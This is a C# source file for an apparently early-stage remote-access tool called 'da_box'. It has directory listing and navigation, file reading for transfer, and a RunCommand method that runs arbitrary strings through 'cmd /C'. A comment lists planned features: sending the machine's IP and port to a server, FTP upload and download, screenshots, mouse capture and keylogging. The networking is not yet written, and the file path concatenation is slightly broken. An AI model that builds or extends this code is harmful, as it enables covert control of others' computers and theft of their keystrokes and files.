using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.Drawing;
using System.Diagnostics;

/** FEATURES
 * [x] directory navigation (dir, cd)
 * [ ] ftp (open port, send ip+port to server, up- & download)
 * [ ] screenshot utility
 * [ ] get mouse input / position
 * [ ] log da keys
 */

namespace da_box
{
    public class Box
    {
        private string _path;
        private List<string> dirs;
        private List<string> fils;

        private void Initialize(string path = "")
        {
            if (String.IsNullOrWhiteSpace(path))
                this._path = Directory.GetCurrentDirectory();
            else
                this._path = path;

            this.dirs = new List<string>(Directory.EnumerateDirectories(_path));
            this.fils = new List<string>(Directory.EnumerateFiles(_path));
        }

        public Box(string path = "")
        {
            this._path = "";
            this.dirs = null;
            this.fils = null;

            Initialize(path);
        }

        public string Dir()
        {
            string output = _path + "\n";
            
            foreach (var dir in dirs)   output += dir + "\n";
            foreach (var fil in fils)   output += fil + "\n";

            return output;
        }

        /**
         * 
         */
        public bool Cd(string d)
        {
            if (d == "..")
            {
                Initialize(Directory.GetParent(_path).ToString());
                return true;
            }
            foreach (var dir in dirs)
                if (d == dir.Remove(0, _path.Length+1))
                {
                    Initialize(dir);
                    return true;
                }

            return false;
        }

        public bool DoesFileExist(string file)
        {
            foreach (var fil in fils)
                if (file == fil.Remove(0, _path.Length+1))
                    return true;

            return false;
        }

        public bool RunCommand(string cmd)
        {
            try { Process.Start("cmd", "/C " + cmd); return true;  }
            catch                                  { return false; }
        }

        public string FileToByte(string file)
        {
            /* headerSize ... */
            if (DoesFileExist(file))
                return (5 + file.Length + 3).ToString() + " " + File.ReadAllText(_path + file);
            
            return "empty";
        }
    }
}